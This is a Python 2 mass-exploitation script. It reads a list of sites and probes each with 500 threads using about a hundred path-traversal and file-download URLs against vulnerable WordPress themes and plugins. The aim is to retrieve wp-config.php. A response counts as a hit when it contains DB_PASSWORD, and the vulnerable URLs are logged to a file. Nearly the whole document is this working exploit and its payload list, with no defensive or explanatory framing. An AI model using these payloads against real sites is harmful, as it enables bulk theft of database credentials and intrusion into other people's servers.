import re, sys, requests, os, random, string, time, sys, os, threading, time, re, requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import requests, re, urllib, urllib2, os, sys, codecs, binascii, json, argparse
from multiprocessing.dummy import Pool
import requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import time
from random import sample as rand
from Queue import Queue
from platform import system
from urlparse import urlparse
from optparse import OptionParser
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
import sys, requests, re, datetime
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)
import requests, re, os, sys, codecs, random
from multiprocessing.dummy import Pool
from time import time as timer
import time
from colorama import Fore
from urlparse import urlparse
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from platform import system
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT
warnings.simplefilter('ignore', InsecureRequestWarning)
reload(sys)
sys.setdefaultencoding('utf8')
ktnred = '\x1b[31m'
ktngreen = '\x1b[32m'
ktn3yell = '\x1b[33m'
ktn4blue = '\x1b[34m'
ktn5purp = '\x1b[35m'
ktn6blueblue = '\x1b[36m'
ktn7grey = '\x1b[37m'
CEND = '\x1b[0m'

def urlfix(url):
    if url[(-1)] == '/':
        pattern = re.compile('(.*)/')
        site = re.findall(pattern, url)
        url = site[0]
    if url[:7] != 'http://' and url[:8] != 'https://':
        url = 'http://' + url
    return url


def EXPLOIT(url):
    try:
        paths = [
						'/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
			'/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
			'/wp-content/themes/markant/download.php?file=../../wp-config.php',
			'/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
			'/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
			'/wp-content/themes/felis/download.php?file=../wp-config.php',
			'/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
			'/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php',
			'/wp-content/themes/epic/includes/download.php?file=wp-config.php',
			'/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
			'/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
			'/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
			'/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
			'/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
			'/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
			'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
			'/wp-content/force-download.php?file=../wp-config.php',
			'/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php',
			'/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
			'/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
			'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=',
			'/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php',
			'/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
			'/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
			'/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php',
			'/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php',
			'/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
			'/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php',
			'/wp-content/force-download.php?file=../wp-config.php',
			'/wp-content/blog/secondaryphase/mdocs-posts/?mdocs-img-preview=../../../../wp-config.php',
			'/wp-admin/blog/admin-ajax.php?action=revslider_show_image&img=../../wp-config.php',
			'/mdocs-posts/?mdocs-img-preview=../wp-config.php',
			'/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
			'/force-download.php?file=wp-config.php',
			'/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php',
			'/wp-content/plugins/plugin-newsletter/preview.php?data=../../../wp-config.php',
			'/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../wp-config.php',
			'/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php',
			'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10',
			'/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php',
			'/wp-content/plugins/bookx/includes/bookx_export.php?file=../../../../wp-config.php',
			'/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php',
			'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php',
			'/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php',
			'/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php',
			'/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php',
			'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=../../../../../wp-config.php',
			'/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php',
			'/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php',
			'/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php',
			'/wp-content/plugins/harma-booking/frontend/ajax/gateways/proccess.php?gateway=../../../../../../wp-config.php',
			'/wp-content/plugins/mdocs-posts/?mdocs-img-preview=../../../wp-config.php',
			'/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php',
			'/wp-content/plugins/image-export/download.php?file=../../../wp-config.php',
			'/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php',
			'/wp-content/plugins/sell-downloads/sell-downloads.php?file=./../../../wp-config.php',
			'/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php',
			'/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php',
			'/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==',
			'/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php',
			'/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
			'/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php',
			'/wp-content/plugins/mailz/lists/config/config.php?wpabspath=../../../../../wp-config.php',
			'/wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&blogUrl=asdf&abspath=../../../../wp-config.php',
			'/wp-content/plugins/accept-signups/accept-signups_submit.php?file=../../../wp-config.php',
			'/wp-content/plugins/wp-filemanager/incl/libfile.php?path=&filename=../../../../wp-config.php&action=download',
			'/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php',
			'/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php',
			'/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../wp-config.php&filename=../../../wp-config.php&contenttype=text/html&transient=1',
			'/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php%00',
			'/wp-content/plugins/rb-agency/ext/forcedownload.php?file=../../../../wp-config.php',
			'/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../wp-config.php',
			'/wp-content/plugins/document_manager/views/file_download.php?fname=../../../../wp-config.php',
			'/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php',
			'/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php',
			'/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php',
			'/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php%00',
			'/wp-content/plugins/abtest/abtest_admin.php?action=../../../wp-config.php',
			'/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
			'/wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php',
			'/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
			'/wp-content/themes/corporate_works/downloader.php?file_download=../../wp-config.php',
			'/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php',
			'/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php',
			'/wp-content/themes/tess/download.php?file=../../../wp-config.php',
			'/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
			'/wp-content/themes/yakimabait/download.php?file=../../../wp-config.php',
			'/wp-content/themes/ypo-theme/download.php?download=../../../../wp-config.php',
			'/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
			'/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php',
			'/wp-content/themes/ypo-theme/download.php?download=../../../../wp-config.php',
			'/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
			'/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
			'/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
			'/wp-content/themes/SMWF/inc/download.php?file=../../../../wp-config.php',
			'/wp-content/themes/persuasion/lib/scripts/dl-skin.php',
			'/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
			'/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php']
        for path in paths:
            try:
                payload = url + path
                se3 = requests.session()
                Agent3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
                ktn3 = se3.get(payload, headers=Agent3, verify=False, timeout=30)
                if 'DB_PASSWORD' in ktn3.content:
                    print ('{}{} [SUCCESS wpconfig] ---->  [BETO] :').format(fy, sb) + url
                    open('wpconfigVULN.txt', 'a').write(payload + '\n')
                    break
                else:
                    print ('{}{} [NOT VULN wpconfig] [0] -------> ').format(fr, sb) + url
            except:
                print ('{}{} [FILED] -------> ').format(fr, sb) + url

    except:
        print ('{}{} Site Error !! [FILED] -------> ').format(fr, sb) + url


def check(url):
    try:
        url = urlfix(url)
        Agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        se = requests.session()
        ktn1 = se.get(url, headers=Agent, verify=False, timeout=30)
        if ktn1.status_code == 200:
            print ('{}{} [SITE IS WORKING LOOKING FOR VULN] ---->  [BETO] :').format(fy, sb) + url
            EXPLOIT(url)
        else:
            print ('{}{} SITE IS DOWN... -------> ').format(fr, sb) + url
    except:
        pass


def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
          _____                    _____             _____                   _______         
         /\    \                  /\    \           /\    \                 /::\    \        
        /::\    \                /::\    \         /::\    \               /::::\    \       
       /::::\    \              /::::\    \        \:::\    \             /::::::\    \      
      /::::::\    \            /::::::\    \        \:::\    \           /::::::::\    \     
     /:::/\:::\    \          /:::/\:::\    \        \:::\    \         /:::/~~\:::\    \    
    /:::/__\:::\    \        /:::/__\:::\    \        \:::\    \       /:::/    \:::\    \   
   /::::\   \:::\    \      /::::\   \:::\    \       /::::\    \     /:::/    / \:::\    \  
  /::::::\   \:::\    \    /::::::\   \:::\    \     /::::::\    \   /:::/____/   \:::\____\ 
 /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\    \   /:::/\:::\    \ |:::|    |     |:::|    |
/:::/__\:::\   \:::|    |/:::/__\:::\   \:::\____\ /:::/  \:::\____\|:::|____|     |:::|    |
\:::\   \:::\  /:::|____|\:::\   \:::\   \::/    //:::/    \::/    / \:::\    \   /:::/    / 
 \:::\   \:::\/:::/    /  \:::\   \:::\   \/____//:::/    / \/____/   \:::\    \ /:::/    /  
  \:::\   \::::::/    /    \:::\   \:::\    \   /:::/    /             \:::\    /:::/    /   
   \:::\   \::::/    /      \:::\   \:::\____\ /:::/    /               \:::\__/:::/    /    
    \:::\  /:::/    /        \:::\   \::/    / \::/    /                 \::::::::/    /     
     \:::\/:::/    /          \:::\   \/____/   \/____/                   \::::::/    /      
      \::::::/    /            \:::\    \                                  \::::/    /       
       \::::/    /              \:::\____\                                  \::/____/        
        \::/____/                \::/    /                                   ~~              
         ~~                       \/____/                                                    
                                                                                             
"""
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()

def Main():
    list = raw_input(('{}{}\n\t [ALL-wpconfig-VULN] List Please !  : ').format(fr, sb))
    list = open(list, 'r').read().splitlines()
    try:
        ThreadPool = Pool(500)
        Threads = ThreadPool.map(check, list)
    except:
        pass


if __name__ == '__main__':
    Main()
